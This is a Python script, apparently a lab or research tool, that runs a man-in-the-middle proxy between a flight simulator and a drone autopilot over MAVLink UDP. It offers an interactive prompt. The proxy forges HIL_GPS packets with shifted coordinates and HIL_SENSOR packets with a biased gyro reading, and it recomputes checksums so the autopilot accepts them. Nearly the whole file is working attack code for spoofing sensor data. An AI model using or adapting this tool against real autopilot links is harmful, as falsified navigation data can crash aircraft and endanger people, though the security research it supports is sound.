#!/usr/bin/env python3

import os
import sys
import socket
import re
from threading import Thread
from struct import pack, unpack
from contextlib import contextmanager
from cmd import Cmd
from mavlinkdissector import message_crc, dissect_mavlink
from copy import deepcopy

@contextmanager
def quiet_out():
    with open(os.devnull, 'w') as devnull:
        oldout = sys.stdout
        sys.stdout = devnull
        try:
            yield
        finally:
            sys.stdout = oldout

class SimulatorProxy(Thread):

    def __init__(self, port: int, raddr: str):
        Thread.__init__(self)
        self.setName('SimProxy')
        self.__finish = False
        self.__sock = None
        self.__port = port
        self.__auto_addr = raddr
        self.__sim_addr = None
        self.__sim_port = None
        self.__auto = None
        self.__latitude = None
        self.__longitude = None
        self.__t_gps = False
        self.__t_gyro = False
        self.__gyro_counter = 0
        self.__gps_buffer = []

    def __tamperGPS(self, message: dict) -> bytes :
        c_lat = message['payload']['lat'] + 5000
        if c_lat > 900000000:
            c_lat = -899999999
        lat = [
            int(( c_lat & 0xff000000 ) / 0x1000000),
            int(( c_lat & 0x00ff0000 ) / 0x10000),
            int(( c_lat & 0x0000ff00 ) / 0x100),
            int(c_lat & 0x000000ff)
        ]
        c_lon = message['payload']['lon'] + 5000
        # print(
        #     'TAMPER:\tLAT {0:d}\tLON {1:d} -> LAT {2:d}\tLON {3:d}'.format(
        #         message['payload']['lat'],
        #         message['payload']['lon'],
        #         c_lat,
        #         c_lon
        #     )
        # )
        if c_lon > 1800000000:
            c_lon = -1799999999
        lon = [
            int(( c_lon & 0xff000000 ) / 0x1000000),
            int(( c_lon & 0x00ff0000 ) / 0x10000),
            int(( c_lon & 0x0000ff00 ) / 0x100),
            int(c_lon & 0x000000ff)
        ]
        data = pack(
            '<BBBBBBBHQBBBBBBBBBiHHHhhhHB',
            message['length'],
            message['incompat_flags'],
            message['compat_flags'],
            message['sequence'],
            message['sysid'],
            message['compid'],
            113,
            0,
            message['payload']['time_usec'],
            message['payload']['fix_type'],
            lat[2],
            lat[1],
            lat[0],
            lat[3],
            lon[2],
            lon[1],
            lon[0],
            lon[3],
            message['payload']['alt'],
            message['payload']['eph'],
            message['payload']['epv'],
            message['payload']['vel'],
            message['payload']['vn'],
            message['payload']['ve'],
            message['payload']['vd'],
            message['payload']['cog'],
            message['payload']['satellites_visible']
        )
        crc = message_crc(data, 113)
        data = b'\xfd' + data + pack('<H',crc)
        self.__gps_buffer.append(
            (
                float(message['payload']['lat'])/float(10**7),
                float(message['payload']['lon'])/float(10**7),
                float(c_lat)/float(10**7),
                float(c_lon)/float(10**7)
            )
        )
        return data

    def __tamperGyro(self, message: dict) -> bytes:
        fiu = 0
        if message['payload']['fields_updated']['time_usec']:
            fiu += 0x00000001
        if message['payload']['fields_updated']['xacc']:
            fiu += 0x00000002
        if message['payload']['fields_updated']['yacc']:
            fiu += 0x00000004
        if message['payload']['fields_updated']['zacc']:
            fiu += 0x00000008
        if message['payload']['fields_updated']['xgyro']:
            fiu += 0x00000010
        if message['payload']['fields_updated']['ygyro']:
            fiu += 0x00000020
        if message['payload']['fields_updated']['zgyro']:
            fiu += 0x00000040
        if message['payload']['fields_updated']['xmag']:
            fiu += 0x00000080
        if message['payload']['fields_updated']['ymag']:
            fiu += 0x00000100
        if message['payload']['fields_updated']['zmag']:
            fiu += 0x00000200
        if message['payload']['fields_updated']['abs_pressure']:
            fiu += 0x00000400
        if message['payload']['fields_updated']['diff_pressure']:
            fiu += 0x00000800
        if message['payload']['fields_updated']['pressure_alt']:
            fiu += 0x00001000
        if message['payload']['fields_updated']['temperature']:
            fiu += 0x00002000
        if message['payload']['fields_updated']['full_reset']:
            fiu += 0x80000000
        data = pack(
            '<BBBBBBBHQfffffffffffffI',
            message['length'],
            message['incompat_flags'],
            message['compat_flags'],
            message['sequence'],
            message['sysid'],
            message['compid'],
            107,
            0,
            message['payload']['time_usec'],
            message['payload']['xacc'],
            message['payload']['yacc'],
            message['payload']['zacc'],
            message['payload']['xgyro'] + 0.1,
            message['payload']['ygyro'],
            message['payload']['zgyro'],
            message['payload']['xmag'],
            message['payload']['ymag'],
            message['payload']['zmag'],
            message['payload']['abs_pressure'],
            message['payload']['diff_pressure'],
            message['payload']['pressure_alt'],
            message['payload']['temperature'],
            0
        )
        crc = message_crc(data, 107)
        data = b'\xfd' + data + pack('<H',crc)
        return data

    def getGPSBuffer(self) -> list:
        retval = deepcopy(self.__gps_buffer)
        self.__gps_buffer.clear()
        return retval

    def toggleTamperGPS(self):
        self.__t_gps = not self.__t_gps

    def toggleTamperGyro(self):
        self.__t_gyro = not self.__t_gyro

    def setFinish(self):
        self.__finish = True

    def isonline(self):
        return not self.__finish

    def printCoord(self):
        msg = 'Current GPS:\tLAT {0:f}\tLON {1:f}'.format(self.__latitude, self.__longitude)
        print(msg)

    def recv(self, data):
        if self.__sock is not None and self.__sim_addr is not None:
            try:
                self.__sock.sendto(data, (self.__sim_addr, self.__sim_port))
            except IOError:
                sys.stderr.write('Simulator socket error\r\n')
    
    def run(self):
        self.__sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        self.__sock.bind(('0.0.0.0', self.__port))
        print('Awaiting connection from simulator ...')
        data, simaddr = self.__sock.recvfrom(4096)
        print('New simulator connected from {0:s}:{1:d}'.format(simaddr[0], simaddr[1]))
        print('Connecting to autopilot in {0:s} ...'.format(self.__auto_addr))
        self.__sim_addr = simaddr[0]
        self.__sim_port = simaddr[1]
        self.__auto = AutopilotProxy(self.__auto_addr, self.__port, self)
        self.__auto.write(data)
        self.__auto.start()
        while not self.__finish:
            try:
                buffer = self.__sock.recv(280)
                with quiet_out():
                    message = dissect_mavlink(buffer)[0]
                if 'id' in message.keys() and message['id'] == 113: # HIL_GPS
                    self.__latitude = float(message['payload']['lat'])/float(10**7)
                    self.__longitude = float(message['payload']['lon'])/float(10**7)
                    if not self.__t_gps:
                        self.__gps_buffer.append(
                            (float(self.__latitude),float(self.__longitude),float(self.__latitude),float(self.__longitude))
                        )
                        self.__auto.write(buffer)
                    else:
                        payload = self.__tamperGPS(message)
                        if payload is not None:
                            self.__auto.write(payload)
                        else:
                            self.__auto.write(buffer)
                elif 'id' in message.keys() and message['id'] == 107: # HIL_SENSOR
                    if not self.__t_gyro:
                        self.__auto.write(buffer)
                    else:
                        self.__gyro_counter -= 1
                        if self.__gyro_counter < 0:
                            self.__gyro_counter = 1000
                            self.__auto.write(buffer)
                        elif self.__gyro_counter == 0:
                            self.__t_gyro = False
                            self.__auto.write(buffer)
                        else:
                            payload = self.__tamperGyro(message)
                            if payload is not None:
                                self.__auto.write(payload)
                            else:
                                self.__auto.write(buffer)
                else:
                    self.__auto.write(buffer)
            except ConnectionResetError:
                self.__finish = True
        self.__sock = None
        self.__auto.setFinish()
        self.__auto.join()

class AutopilotProxy(Thread):

    def __init__(self, addr: str, port: int, parent: SimulatorProxy):
        Thread.__init__(self)
        self.setName('AutoProxy')
        self.__addr = addr
        self.__port = port
        self.__parent = parent
        self.__finish = False
        self.__sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
        self.__sock.bind(('0.0.0.0', 14444))
    
    def setFinish(self):
        self.__finish = True

    def write(self, data: bytes):
        if self.__sock is not None:
            try:
                self.__sock.sendto(data, (self.__addr, self.__port))
            except IOError:
                sys.stderr.write('Autopilot socket error\r\n')
    
    def run(self):
        while not self.__finish:
            try:
                buffer = self.__sock.recv(280)
                self.__parent.recv(buffer)
            except ConnectionResetError:
                self.__finish = True
        self.__sock = None

class MitmPrompt(Cmd):

    START_REGEX = r'^(?P<ip_addr>(?:(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)[.]){3}(?:25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d))\s+(?P<port>(?:[1-9]\d{0,3}|[1-5]\d{4}|6[0-4]\d{3}|65[0-4]\d{2}|655[0-2]\d|6553[0-5]))$'

    def __init__(self):
        Cmd.__init__(self)
        self.prompt = 'MAVLink MitM> '
        self.__proxy = None
    
    def emptyline(self):
        pass
    
    def do_start(self, args):
        s_info = re.match(self.START_REGEX, args)
        if s_info is not None:
            if self.__proxy is not None:
                self.__proxy.setFinish()
                self.__proxy.join()
                self.__proxy = None
            self.__proxy = SimulatorProxy(int(s_info.group('port')), s_info.group('ip_addr'))
            self.__proxy.start()
    
    def do_coordinates(self, args):
        if self.__proxy is not None:
            self.__proxy.printCoord()
    
    def do_tampergps(self, args):
        self.__proxy.toggleTamperGPS()
    
    def do_tampergyro(self, args):
        self.__proxy.toggleTamperGyro()

    def do_exit(self, args):
        if self.__proxy is not None:
            self.__proxy.setFinish()
            self.__proxy.join()
        return True
    
    def do_EOF(self, args):
        sys.stdout.write('\r\n')
        return self.do_exit(None)

if __name__ == '__main__':
    try:
        mitm = MitmPrompt()
        mitm.cmdloop()
    except KeyboardInterrupt:
        sys.stdout.write('\r\n')
        mitm.do_exit(None)
